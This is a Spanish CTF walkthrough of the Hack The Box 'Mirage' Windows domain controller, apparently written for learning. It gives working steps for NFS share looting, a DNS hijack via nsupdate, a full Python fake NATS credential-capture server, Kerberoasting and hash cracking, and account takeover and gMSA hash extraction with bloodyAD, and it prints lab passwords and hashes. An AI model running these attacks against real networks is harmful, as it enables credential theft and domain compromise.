***
- Tags: #ActiveDirectory #DCSync #RDBC
***
Vamos a resolver la máquina Mirage. 
- Categoría: Difícil
- Sistema: Windows
- IP: `10.10.11.78
### 1. Enumeración

Realizamos un escaneo inicial con nmap, obteniendo la siguiente información respecto a puertos abiertos:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 17:12 CEST
Nmap scan report for 10.10.11.78
Host is up (0.035s latency).
Not shown: 63721 closed tcp ports (reset), 1785 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4222/tcp  open  vrml-multi-use
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

Estamos ante un DC (Controlador de dominio). Si ahora vamos al detalle, nos encontramos con la siguiente información (aplicando ahora la flag `-sCV` sobre los puertos encontrados):

![[mirage1.png]]

Encontramos el nombre del dominio, por lo que los añadimos a nuestro archivo `/etc/hosts`. Otro puerto que llama la atención es el `4222`, que corresponde a un servicio NATS, un sistema de mensajería basado en el modelo publish/subscribe que suele utilizarse en entornos de microservicios o sistemas distribuidos. En este caso, al conectarnos, el banner nos devuelve información del servidor y un error de autenticación, lo que indica que el acceso está protegido. Aun así, es interesante tenerlo en cuenta por si más adelante conseguimos credenciales válidas, ya que podría permitirnos interceptar o publicar mensajes internos.

![[mirage2.png]]

Observamos que la autenticación NTLM se encuentra deshabilitada, lo cual refuerza la seguridad del entorno al impedir ataques clásicos como Pass-the-Hash o NTLM relay. Esto indica que los servicios expuestos probablemente requieren autenticación Kerberos, lo que limita ciertos vectores habituales si no disponemos de tickets válidos.

```bash
❯ nxc smb 10.10.11.78
SMB         10.10.11.78     445    10.10.11.78      [*]  x64 (name:10.10.11.78) (domain:10.10.11.78) (signing:True) (SMBv1:False) (NTLM:False)
```

Los puertos `111` y `2049` están abiertos, lo que indica la presencia de un servicio NFS activo. Esto es inusual en entornos Windows y puede permitir montar recursos compartidos si la configuración no restringe por IP. De ser accesibles, estos recursos pueden contener archivos sensibles o credenciales útiles para el resto del ataque. Veamos más información sobre ello:

```bash
❯ bash -c 'nmap --script nfs* 10.10.11.78 -sV -p111,2049'
```

```bash
PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
2049/tcp open  nlockmgr 1-4 (RPC #100021)
```

Sabiendo esto, podemos intentar ver `mounts` disponibles de forma pública:

```bash
❯ showmount -e 10.10.11.78
Export list for 10.10.11.78:
/MirageReports (everyone)
```

### 2. Explotación

Lo montamos en nuestro propio sistema y nos lo copiamos:

```bash
sudo mount -t nfs 10.10.11.78:/MirageReports /mnt
sudo cp /mnt/Mirage_Authentication_Hardening_Report.pdf .
```

Le damos permisos:

```bash
sudo chown $USER:$USER *
```

Y los visualizamos, aunque uno de ellos no carga, el otro, 'Mirage_Authentication_Hardening_Report.pdf' se visualiza bien con cualquier navegador. Tiene el siguiente contenido:

![[mirage3.png]]

Uno de los documentos encontrados en el share NFS confirma que el dominio `mirage.htb` está migrando a un modelo de autenticación exclusivo mediante Kerberos. El informe detalla cómo NTLM está siendo progresivamente eliminado por motivos de seguridad, con auditorías activas, bloqueo parcial ya aplicado, y despliegues de prueba en marcha. Esto implica que ataques basados en NTLM (relay, pass-the-hash, etc.) no son viables, y que el entorno depende únicamente de Kerberos. Sabiendo esto, modificamos nuestro `/etc/krb5.conf` para modificar el `realm` y así solicitar tickets al dominio `MIRAGE.HTB`:

![[mirage5.png]]

Llegados a este punto, tendremos que movernos hacia un ataque de secuestro de DNS y crear un archivo llamado `dnsupdate.txt` con el siguiente contenido:

```
server 10.10.11.78
zone mirage.htb
update delete nats-svc.mirage.htb A
update add nats-svc.mirage.htb 60 A 10.10.14.24
send
```

> Aprovechamos que el servidor DNS del dominio acepta actualizaciones dinámicas no autenticadas para realizar un secuestro DNS. Eliminamos el registro original de `nats-svc.mirage.htb` y lo redirigimos hacia nuestra máquina atacante. Esto nos permite interceptar posibles conexiones legítimas dirigidas al servicio NATS, lo cual puede facilitar robo de credenciales o suplantación de servicio.

Por otro lado, creamos un script python que actúe como servidor falso NATS en el puerto `4222`:

```python
#!/usr/bin/env python3

import socket
import threading
import time
from datetime import datetime
import json
import base64

class FakeNATSServer:
    def __init__(self, host='0.0.0.0', port=4222):
        self.host = host
        self.port = port
        self.running = False
        self.clients = []

    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")

    def handle_client(self, client_socket, client_address):
        self.log(f"New connection from {client_address[0]}:{client_address[1]}")

        try:
            # Send NATS server info message (mimicking real NATS server)
            info_msg = {
                "server_id": "fake-nats-server",
                "version": "2.9.0",
                "proto": 1,
                "host": "0.0.0.0",
                "port": 4222,
                "max_payload": 1048576,
                "client_id": len(self.clients)
            }
            info_line = f"INFO {json.dumps(info_msg)}\r\n"
            client_socket.send(info_line.encode())
            self.log(f"Sent INFO: {info_line.strip()}")

            while self.running:
                try:
                    # Receive data from client
                    data = client_socket.recv(4096)
                    if not data:
                        break

                    message = data.decode('utf-8', errors='ignore').strip()
                    self.log(f"RECEIVED from {client_address[0]}: {repr(message)}")

                    # Parse different NATS protocol messages
                    lines = message.split('\r\n')
                    for line in lines:
                        if not line:
                            continue

                        self.parse_nats_message(line, client_address)

                    # Send acknowledgment for any message
                    response = "+OK\r\n"
                    client_socket.send(response.encode())

                except socket.timeout:
                    continue
                except Exception as e:
                    self.log(f"Error handling client {client_address}: {str(e)}")
                    break

        except Exception as e:
            self.log(f"Connection error with {client_address}: {str(e)}")
        finally:
            self.log(f"Connection closed: {client_address[0]}:{client_address[1]}")
            client_socket.close()
            if client_socket in self.clients:
                self.clients.remove(client_socket)

    def parse_nats_message(self, line, client_address):
        """Parse and log different types of NATS messages"""
        parts = line.split(' ', 1)
        if not parts:
            return

        command = parts[0].upper()

        if command == 'CONNECT':
            # CONNECT message contains client info and potentially credentials
            try:
                json_part = parts[1] if len(parts) > 1 else '{}'
                connect_info = json.loads(json_part)
                self.log(f"🔐 CONNECT from {client_address[0]}: {json.dumps(connect_info, indent=2)}")

                # Look for credentials
                if 'user' in connect_info:
                    self.log(f"🎯 USERNAME CAPTURED: {connect_info['user']}")
                if 'pass' in connect_info:
                    self.log(f"🎯 PASSWORD CAPTURED: {connect_info['pass']}")
                if 'auth_token' in connect_info:
                    self.log(f"🎯 TOKEN CAPTURED: {connect_info['auth_token']}")
                if 'sig' in connect_info:
                    self.log(f"🎯 SIGNATURE CAPTURED: {connect_info['sig']}")
                if 'jwt' in connect_info:
                    self.log(f"🎯 JWT TOKEN CAPTURED: {connect_info['jwt']}")

            except json.JSONDecodeError as e:
                self.log(f"CONNECT (JSON parse error): {line}")
                self.log(f"JSON Error: {str(e)}")

        elif command == 'PUB':
            self.log(f"📤 PUBLISH: {line}")

        elif command == 'SUB':
            self.log(f"📥 SUBSCRIBE: {line}")

        elif command == 'PING':
            self.log(f"🏓 PING received")

        elif command == 'PONG':
            self.log(f"🏓 PONG received")

        elif command == 'MSG':
            self.log(f"📨 MESSAGE: {line}")

        else:
            self.log(f"❓ UNKNOWN COMMAND: {line}")

    def start(self):
        """Start the fake NATS server"""
        self.running = True

        # Create socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            self.log(f"🚀 Fake NATS Server started on {self.host}:{self.port}")
            self.log("📡 Waiting for connections...")
            self.log("🎯 Ready to intercept credentials!")

            while self.running:
                try:
                    client_socket, client_address = server_socket.accept()
                    client_socket.settimeout(30)  # 30 second timeout
                    self.clients.append(client_socket)

                    # Handle each client in a separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()

                except socket.error as e:
                    if self.running:
                        self.log(f"Socket error: {str(e)}")

        except Exception as e:
            self.log(f"Server error: {str(e)}")
        finally:
            server_socket.close()
            self.log("Server stopped.")

    def stop(self):
        """Stop the server"""
        self.running = False
        for client in self.clients:
            client.close()

def main():
    # You can also try other common NATS ports:
    # 4222 - Default NATS port
    # 8222 - NATS monitoring port  
    # 6222 - NATS cluster port

    server = FakeNATSServer(host='0.0.0.0', port=4222)

    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[+] Shutting down server...")
        server.stop()

if __name__ == "__main__":
    print("🎭 Fake NATS Server - Credential Interceptor")
    print("=" * 50)
    main()

```

> Se desplegó un servidor NATS falso en el puerto `4222` tras secuestrar el DNS de `nats-svc.mirage.htb`. El script simula el comportamiento de un servidor legítimo y permite capturar credenciales o tokens que los clientes envíen en sus mensajes `CONNECT`. Si algún servicio del entorno intenta autenticarse, se podrán obtener usuarios, contraseñas o JWTs en texto plano.

En este punto, con el comando `nsupdate -v dnsupdate.txt` enviamos una petición al servidor DNS del dominio para eliminar el registro original de `nats-svc.mirage.htb` y reemplazarlo por uno que apunta a nuestra máquina. Esto permite redirigir conexiones legítimas hacia nuestro servidor falso y capturar credenciales o datos sensibles sin necesidad de explotar directamente el servicio original. 

**📌 Paso a paso:**

1. **`server 10.10.11.78`**    
    - Indica a `nsupdate` que se comunique con el servidor DNS del dominio (probablemente el DC).        
    
2. **`zone mirage.htb`**    
    - Define la zona DNS sobre la que queremos operar. En este caso, la del dominio completo.
        
3. **`update delete nats-svc.mirage.htb A`**    
    - Elimina el registro A (IPv4) asociado al nombre `nats-svc.mirage.htb`.
        
4. **`update add nats-svc.mirage.htb 60 A <YOUR_IP>`**    
    - Añade un nuevo registro A con TTL de 60 segundos, haciendo que ese nombre apunte a **tu IP**, donde tienes corriendo el servidor falso NATS.
        
5. **`send`**    
    - Envía la transacción al servidor.

**🎯 ¿Qué consigues?**

Manipulas la resolución de nombre **desde dentro del dominio**, sin tocar el DNS público ni el sistema de archivos. Cualquier **servicio, script o cliente interno** que intente resolver `nats-svc.mirage.htb` ahora irá directamente a tu máquina atacante.

Este movimiento es **clave** porque:

- Has **intervenido el tráfico sin acceso al host original**.    
- Aprovechas la **confianza del sistema** en su propio DNS para redirigir servicios críticos.    
- No requiere explotación directa, solo una **mala configuración DNS** (actualizaciones dinámicas sin control).

Comprobamos que se ha aplicado correctamente:

```bash
❯ dig @10.10.11.78 nats-svc.mirage.htb

; <<>> DiG 9.20.9-1-Debian <<>> @10.10.11.78 nats-svc.mirage.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32892
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;nats-svc.mirage.htb.		IN	A

;; ANSWER SECTION:
nats-svc.mirage.htb.	60	IN	A	10.10.14.24

;; Query time: 35 msec
;; SERVER: 10.10.11.78#53(10.10.11.78) (UDP)
;; WHEN: Fri Jul 25 20:08:45 CEST 2025
;; MSG SIZE  rcvd: 64
```

Ahí podemos ver nuestra IP (`10.10.14.24`. ) Por otro lado, lanzamos el listener en python. Esto tiene que realizarse de inmediato o no funcionará.

```
🎭 Fake NATS Server - Credential Interceptor
==================================================
[2025-07-25 20:12:25] 🚀 Fake NATS Server started on 0.0.0.0:4222
[2025-07-25 20:12:25] 📡 Waiting for connections...
[2025-07-25 20:12:25] 🎯 Ready to intercept credentials!
[2025-07-25 20:12:36] New connection from 10.10.11.78:64003
[2025-07-25 20:12:36] Sent INFO: INFO {"server_id": "fake-nats-server", "version": "2.9.0", "proto": 1, "host": "0.0.0.0", "port": 4222, "max_payload": 1048576, "client_id": 1}
[2025-07-25 20:12:36] RECEIVED from 10.10.11.78: 'CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}\r\nPING'
[2025-07-25 20:12:36] 🔐 CONNECT from 10.10.11.78: {
  "verbose": false,
  "pedantic": false,
  "user": "Dev_Account_A",
  "pass": "hx5h7F5554fP@1337!",
  "tls_required": false,
  "name": "NATS CLI Version 0.2.2",
  "lang": "go",
  "version": "1.41.1",
  "protocol": 1,
  "echo": true,
  "headers": false,
  "no_responders": false
}
[2025-07-25 20:12:36] 🎯 USERNAME CAPTURED: Dev_Account_A
[2025-07-25 20:12:36] 🎯 PASSWORD CAPTURED: hx5h7F5554fP@1337!
[2025-07-25 20:12:36] 🏓 PING received
[2025-07-25 20:12:36] Connection closed: 10.10.11.78:64003
```

Y ahí tenemos un usuario y su contraseña. Utilizando el cliente oficial `nats`, nos conectamos al servidor NATS real con las credenciales capturadas. Debemos instalar `nats` si no lo teníamos de antes:

```bash
wget https://github.com/nats-io/natscli/releases/download/v0.1.4/nats-0.1.4-linux-amd64.zip
unzip nats-0.1.4-linux-amd64.zip
sudo mv nats /usr/local/bin/
sudo chmod +x /usr/local/bin/nats/

# Lo añadimos al PATH en el .zshrc
export PATH=$PATH:/usr/local/bin/nats/
```

```bash
nats --server nats://mirage.htb:4222 rtt --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
   nats://10.10.11.78:4222: 52.302558ms
   
nats stream ls --server nats://mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
╭─────────────────────────────────────────────────────────────────────────────────╮
│                                     Streams                                     │
├───────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message │
├───────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ auth_logs │             │ 2025-05-05 09:18:19 │ 5        │ 570 B │ 82d18h9m29s  │
╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯

nats consumer add auth_logs reader --pull --server nats://mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'

nats consumer next auth_logs reader --count=5 --server nats://mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!'
```

> Es muy importante hacer esto rápido antes de que se modifique el registro DNS. Solo funcionará si sigue apuntando a nuestra IP. El secuestro de DNS es necesario porque el cliente NATS está configurado para conectarse a un nombre concreto (`nats-svc.mirage.htb`). Al redirigir ese nombre hacia nuestra IP, conseguimos que el cliente confíe en nuestro servidor falso y nos envíe sus credenciales sin sospechar. Esto permite interceptar datos internos que normalmente irían a un servidor legítimo.

Obtenemos las credenciales:

```
[20:29:41] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[20:29:41] subj: logs.auth / tries: 1 / cons seq: 2 / str seq: 2 / pending: 3

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[20:29:42] subj: logs.auth / tries: 1 / cons seq: 3 / str seq: 3 / pending: 2

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[20:29:42] subj: logs.auth / tries: 1 / cons seq: 4 / str seq: 4 / pending: 1

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message

[20:29:42] subj: logs.auth / tries: 1 / cons seq: 5 / str seq: 5 / pending: 0

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message
```

Lanzamos BloodHound con las credenciales del primer usuario, que es `david.jjackson` y su contraseña es `pN8kQmn6b86!1234@`, pero nos va a petar por la desincronización horaria con Kerberos. Necesitamos averiguar la fecha y hora del DC. Para ello, nos ponemos en otro terminal y realizamos una captura en el puerto 88, que es el de Kerberos:

```bash
sudo tcpdump -ni tun0 port 88 -w kerberos_skew.pcap
```

Después, enviamos en otro terminal una solicitud de ticket (TGT) con impacket:

```bash
impacket-getTGT mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -dc-ip 10.10.11.78   
```

Cerramos la captura y la abrimos con WireShark:

```bash
wireshark kerberos_skew.pcap
```

Una vez dentro, filtramos por búsqueda el campo `kerberos && kerberos.error_code == 0x25`

![[mirage6.png]]

Ahí tenemos la fecha y hora. Tendremos que poner nuestra fecha y hora local acorde:

```bash
sudo systemctl stop systemd-timesyncd.service
sudo date -s "2025-07-27 03:42:54"
```

Ahora, BloodHound nos va a funcionar y obtendremos el zip correctamente.

> Para poner de nuevo la hora bien:

```bash
sudo timedatectl set-ntp true
sudo systemctl start systemd-timesyncd.service
```

Abrimos BloodHound y cargamos el zip. 

![[mirage7.png|500]]

Una vez haya terminado, buscamos cuentas vulnerables a `Kerberoasting`. Podemos consultar qué es esto [[Kerberoasting|aquí]] . 

![[mirage8.png]]

Ahí tenemos la cuenta de `NATHAN.AADAM@MIRAGE.HTB` vulnerable a este ataque. Esto indica que es un usuario con SPN configurado, no requiere de preautenticación y que podemos pedir su ticket TGS para después usar hashcat o john y sacar su contraseña. Vamos a obtener el TGT y guardarlo como ccache:

```bash
impacket-getTGT mirage.htb/david.jjackson:'pN8kQmn6b86!1234@'
```

> Esto te genera un TGT válido (si las credenciales son correctas) y lo guarda como `david.jjackson.ccache`.

Después, exportamos la variable `KRB5CCNAME`

```bash
export KRB5CCNAME=david.jjackson.ccache
```

> Con esto indicas a herramientas como `impacket-GetUserSPNs` o `impacket-psexec` que usen ese ticket en lugar de pedir de nuevo la contraseña.

Finalmente, obtenemos los hashes Kerberoast con dicho TGT

```bash
impacket-GetUserSPNs -k -no-pass -dc-host dc01.mirage.htb mirage.htb/ -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 23:18:18.584667  2025-07-04 22:01:43.511763             



$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$5505aebdd3c850a68ec492d6f8dc37ee$d8ec3c0c9dec2d2c6e019d92ab4692b4d6539ab38ffe135df34a5e0a6ffdc576086790e5da2efa77b434f4ca87058d299ee74df9829c0fab97ab190557d0c93ac6528bcf547988fe0cbd9dcf72df95c66e11d04dee258ec5edfc2aa74d064f449a875c0e374cb7eb53f3c28a14867f242956a309cbd0e844d59018a85b5060b235cda0d8ccc2f610d27d0c5066c48e28c39eff0ed777d81ae21175c4604dc1056329b3d82562d4fcbf8a5195c260e1f1edf1b0550ed2aafcd5bdb2659c3f6e3e1c6079a5890b3b9a43b0d31ebc971694f57891379ffb23ee40189c61fad6e06a4538e5bc3af56123e89580086d5332a403884498bb65bba5df310784e4cb329c9be6a80b053e1655f19416761b7f841b372f6cd961e8d30374d2f528194705bfe2e452668e993f292931113ebd14ed0169d2e8942268ce39d25178cee63f464425e58df5883738c03fd7d319fffd12a9cafe81f82a2bc92cad4b27044cd8c80426aa0df9335b856de8dba0d12fd4c37790b5133c80a1d62ff2ff54a7f674c3de3c9f9050396d4912d813cbacd3242868e1d48542931dfbad1cb9b0ec5d1ad0db73273a70ed801b971a63e1c3e5872fbbe196989ff73adcc915c1410c662658aec6003b3d032c8e6cee6c4ab61793194aa113214dcae49674b043a9b17e80642683aafe7eefbbbdefd2ef958689f6dd82614214d1a4e36b0e7f68ec9083be135fd36bd94a04e52d2ab7e7ed9ca223238f6d1098c74bb6d2b850949f65ae75f8961e1e45c513c20685cf6aca2bec7d4f6ec891f5e6012649daa8502b2e7902f25332751caad4dc866640f80f89aee2385eaafce0d6dea0ba780a35eba2399c5ed9dc03de96c07e92e5594c82c72da5b4771ab2c0ffaa9357de5e74c7161a7eeec6e430fd45983548f313ff753b094e5200e4e0d525035491360047074144a4ba3a9c4822803505624ffa54e3503a78a4d68bfccd500a4f34eebbabb8ddb3835de03d15ef417260b8a62f00a9ce10dfb7471ef5f3049028a8384d73cbeeb9f1bb0defc2db5dade657ff5805629d53c1da4649064dced3ed8e8a13685241e27d69f563cc46085ccb29f48b434a3b8acd7197b0a780493bed35a2cb7bbb17913d0cbbc01ee2dd43aa59cf20ae0b0ee62ad2399deb5e6340b670198614dd04bc01b4983b760d99c86d99e61e44eb413f33b9afe5372f9787074f0b15ff1138ac66118ff945d781462b056d97d1bda93888090a77f6f040044dc2d4086849ccb5b49616fcc78b01fcbd3be06f960141e15441c03247eca9ca478e1dbddca4f40438a53037ea4f829727400591790fe8e89d6179acc80c1a639ff40d4d0c42475259fce552a8530cb8f5bf6a2ec0d08710f428f9de2e0fc0117980edfe578a1849389cd9b0371e9dec29108a3e5edbbfac564444cd768b509737532c70ee0f98d36243fbd3dc948d79c6f9b0e28486be055f45e793185387f0c8968e1c966f37e3a3491555fb0ea6424ac660bf8b6f6951de78829a0c76574316fbab5a2c7ed8486fd6737881b8a867ce83d8df38fbeb97eec266a9fb953aa5b6ec7dc2
```

Ahora, usamos `john` para crackear el hash. Lo guardamos en un txt y procedemos:

```bash
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3edc#EDC3        (?)     
1g 0:00:00:02 DONE (2025-07-27 05:54) 0.3816g/s 4759Kp/s 4759Kc/s 4759KC/s 3er733..3butch
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ahí tenemos la contraseña del usuario Nathan, vulnerable a Kerberoasting. Nos conectamos por `evil-winrm` con sus credenciales, aunque previamente tendremos que tener guardado su ticket:

```bash
❯ impacket-getTGT mirage.htb/nathan.aadam:'3edc#EDC3'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
❯ export KRB5CCNAME=nathan.aadam.ccache
```

> Dado que en el dominio `MIRAGE.HTB` el protocolo NTLM está deshabilitado, la autenticación debe realizarse exclusivamente mediante Kerberos. Para ello, primero se obtiene un Ticket Granting Ticket (TGT) válido con `impacket-getTGT`, lo que permite autenticar al usuario frente al KDC. Ese ticket se guarda en un archivo `.ccache`, y la variable `KRB5CCNAME` se establece para que las herramientas (como `evil-winrm` con `-k`) utilicen automáticamente ese ticket en lugar de NTLM o contraseñas en texto plano. Sin este paso, cualquier intento de conexión fallaría porque no habría un mecanismo de autenticación Kerberos válido disponible.

Nos conectamos con `evil-winrm` y capturamos la flag de usuario:

```bash
evil-winrm -i dc01.mirage.htb -r mirage.htb
```

![[mirage9.png]]

### 3. Escalada de privilegios

Vamos a subir `winPEASX64.exe`. Por si no lo tenemos descargado, se encuentra [aquí](https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe) (_basta con hacer un wget al enlace_). Para subirlo, es tan sencillo como desde la sesión con Evil-WINRM, hacer esto:

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> upload winPEASX64.exe
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> .\winPEASx64.exe
```

Encontramos esta información interesante. Tenemos al usuario mark.bbond@mirage.htb:

![[mirage10.png]]

Vamos a buscar ahora en BloodHound información interesante sobre él: 

![[mirage11.png]]

Vemos que el usuario `mark.bbond` tiene permisos delegados sobre el grupo `IT_SUPPORT`, lo que le permite modificar el grupo sin ser miembro. Podemos aprovecharlo para escalar privilegios si el grupo tiene acceso valioso. Y además tenemos su contraseña por `AutoLogon`. Además, vemos que el usuario `javier.mmarshall` se encuentra deshabilitado:

![[mirage12.png]]

Aunque `mark.bbond` tenga permisos útiles sobre objetos (como `IT_SUPPORT`), el hecho de que esté deshabilitado hace que **no puedas usar su cuenta directamente para autenticaciones ni para escalar privilegios tal cual**. Necesitas transferir o abusar de sus permisos desde otra cuenta activa.

El atributo `logonHours` puede restringir cuándo un usuario puede iniciar sesión. Si todas las horas están desactivadas, entonces **el usuario no puede iniciar sesión nunca**, aunque la cuenta esté marcada como `Enabled`. Esto se usa a veces como medida de seguridad adicional, o en entornos mal configurados. Es una forma más sutil que simplemente marcar la cuenta como deshabilitada.

En este punto, utilizamos la herramienta `bloodyAD`, que tenemos que descargar del repositorio oficial: https://github.com/CravateRouge/bloodyAD

Usemos la herramienta en este orden:

```bash
python3 bloodyAD.py --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object javier.mmarshall userAccountControl -v 512
```

> Usamos **bloodyAD** para modificar el atributo `userAccountControl` de la cuenta `javier.mmarshall`, estableciendo su valor a `512`, que corresponde a una cuenta habilitada. Esto nos permitió reactivar una cuenta previamente deshabilitada, aprovechando que nuestro usuario (`mark.bbond`) tenía permisos `GenericWrite` sobre ese objeto. Con la cuenta habilitada, pudimos utilizarla para autenticarnos en el dominio y continuar con la post-explotación.

Después, usamos **bloodyAD** para modificar el atributo `logonHours` de la cuenta `javier.mmarshall`, estableciendo todos los bits como permitidos. Esto eliminó cualquier restricción horaria que impidiera el inicio de sesión, asegurando que la cuenta pudiera autenticarse en cualquier momento del día o la semana.

```bash
python3 bloodyAD.py --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set object javier.mmarshall logonHours
```

Finalmente, usamos **bloodyAD** para establecer una nueva contraseña en la cuenta `javier.mmarshall`, configurándola como `Password123@`. Gracias a los permisos `GenericWrite` que teníamos sobre el objeto, pudimos modificar directamente el atributo de contraseña sin necesidad de conocer la anterior, obteniendo así acceso completo a la cuenta.

```bash
python3 bloodyAD.py --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' -k set password javier.mmarshall 'Password123@'

[+] Password changed successfully!
```

`MIRAGE-SERVICES` parece ser una **Group Managed Service Account (gMSA)**. Este tipo de cuentas son usadas normalmente por servicios para autenticarse de forma automática en el dominio, y sus contraseñas son **rotadas automáticamente** por el DC.

La clave está en esto:  
🔐 **las contraseñas de las gMSA no se pueden establecer manualmente**... pero **pueden leerse por las cuentas autorizadas** (como `javier.mmarshall` en este caso).

![[mirage13.png]]

> A través de BloodHound detectamos que la cuenta `javier.mmarshall` tenía permisos de tipo `ReadGMSAPassword` sobre la cuenta gestionada `MIRAGE-SERVICES`. Esto nos permitió extraer la contraseña en texto claro de dicha cuenta utilizando herramientas específicas, como `gMSAextractor.py`, y posteriormente autenticarnos con sus credenciales, lo que facilitó el movimiento lateral en el dominio.

Este permiso concede acceso de lectura al atributo `msDS-ManagedPassword` de una cuenta gMSA (Group Managed Service Account). Este atributo contiene un blob cifrado que almacena, entre otros datos, la contraseña actual de la cuenta. Por diseño, las gMSA no permiten autenticación manual ni establecen contraseñas visibles, pero cualquier cuenta con este permiso puede consultar dicho atributo y decodificarlo para obtener **el hash NTLM o incluso la contraseña en texto claro**. Esto convierte `ReadGMSAPassword` en un vector de ataque muy potente en entornos donde las gMSA tienen privilegios elevados.

El siguiente paso es extraer hashes. Usamos **bloodyAD** con la cuenta `javier.mmarshall` para extraer el atributo `msDS-ManagedPassword` de la gMSA `Mirage-Service$`, ya que teníamos permisos `ReadGMSAPassword` sobre ella. El valor obtenido fue un blob binario que contenía la contraseña cifrada. A continuación, usamos `gMSADumper` para decodificar el blob y recuperar la contraseña en texto claro, lo que nos permitió autenticarnos como esa cuenta de servicio. Este atributo contiene un blob binario con la siguiente información:

- **La contraseña en texto claro** (internamente, dentro del blob, aunque cifrada).    
- Fecha de expiración.    
- Metadata de gestión de la gMSA.    

Este blob puede ser parseado para **extraer el hash NTLM** o incluso la **contraseña en texto claro**, si se interpreta correctamente.

```bash
python3 bloodyAD.py -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Password123@' get object 'Mirage-Service$' --attr msDS-ManagedPassword


distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
